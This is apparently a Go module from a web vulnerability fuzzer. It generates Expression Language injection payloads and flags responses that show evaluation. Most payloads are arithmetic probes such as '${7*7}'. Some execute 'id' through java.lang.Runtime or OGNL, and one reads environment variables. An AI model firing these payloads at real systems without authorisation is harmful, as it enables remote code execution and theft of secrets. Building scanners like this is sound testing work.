package vulns

import (
	"strings"

	"github.com/renansj/ryofuzz/internal/input"
	"github.com/renansj/ryofuzz/internal/mutator"
)

type ELInjectModule struct{}

func (m *ELInjectModule) Name() string        { return "el" }
func (m *ELInjectModule) Description() string { return "Expression Language Injection" }

func (m *ELInjectModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload

	elPayloads := []struct {
		value   string
		variant string
	}{
		{"${7*7}", "el-dollar"},
		{"#{7*7}", "el-hash"},
		{"%{7*7}", "el-percent"},
		{"@{7*7}", "el-at"},
		{"${7*7*7}", "el-dollar-343"},
		{"${T(java.lang.Runtime).getRuntime()}", "el-runtime"},
		{"${applicationScope}", "el-appscope"},
		{"${pageContext}", "el-pagecontext"},
		{"#{request.getParameter('x')}", "el-request"},
		{"${T(java.lang.System).getenv()}", "el-env"},
		{"${class.forName('java.lang.Runtime')}", "el-class"},
		{"*{T(java.lang.Runtime).getRuntime().exec('id')}", "el-star-exec"},
		{"${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}", "el-ognl"},
	}

	for _, point := range points {
		for _, p := range elPayloads {
			payloads = append(payloads, mutator.Payload{
				Value: p.value, Point: point, Module: "el", Variant: p.variant,
				Metadata: map[string]string{"check": "49"},
			})
		}
	}
	return payloads
}

func (m *ELInjectModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {

	// Check for 49 (7*7) in response but not in baseline
	if strings.Contains(payload.Variant, "el-dollar") || strings.Contains(payload.Variant, "el-hash") ||
		strings.Contains(payload.Variant, "el-percent") || strings.Contains(payload.Variant, "el-at") {
		if strings.Contains(respBody, "49") && !strings.Contains(baseBody, "49") {
			return &Finding{
				Module:      "el",
				Severity:    "critical",
				Confidence:  "confirmed",
				Title:       "Expression Language Injection - Arithmetic evaluated",
				Description: "The server evaluated an EL expression (7*7=49), confirming code injection",
				Payload:     payload.Value,
				Point:       payload.Point,
				Evidence:    "Response contains '49' (from 7*7) not present in baseline",
				OWASP:       "A03:2021",
				CWE:         "CWE-917",
			}
		}
	}

	// Check for 343 (7*7*7)
	if payload.Variant == "el-dollar-343" {
		if strings.Contains(respBody, "343") && !strings.Contains(baseBody, "343") {
			return &Finding{
				Module:      "el",
				Severity:    "critical",
				Confidence:  "confirmed",
				Title:       "Expression Language Injection - Complex expression evaluated",
				Description: "The server evaluated 7*7*7=343, confirming EL injection",
				Payload:     payload.Value,
				Point:       payload.Point,
				Evidence:    "Response contains '343' (from 7*7*7) not present in baseline",
				OWASP:       "A03:2021",
				CWE:         "CWE-917",
			}
		}
	}

	// Check for Java class/runtime reflection output (guard against echoed payload)
	if strings.Contains(payload.Variant, "runtime") || strings.Contains(payload.Variant, "exec") ||
		strings.Contains(payload.Variant, "env") || strings.Contains(payload.Variant, "class") {
		indicators := []string{"java.lang.Runtime@", "java.lang.Process@", "uid=", "PATH=", "HOME="}
		for _, ind := range indicators {
			if indicatorConfirmed(respBody, baseBody, payload.Value, ind) {
				return &Finding{
					Module:      "el",
					Severity:    "critical",
					Confidence:  "confirmed",
					Title:       "Expression Language Injection - Code execution",
					Description: "Java runtime class or system output detected in response (not echoed payload)",
					Payload:     payload.Value,
					Point:       payload.Point,
					Evidence:    "Java indicator '" + ind + "' found in response",
					OWASP:       "A03:2021",
					CWE:         "CWE-917",
				}
			}
		}
	}

	return nil
}
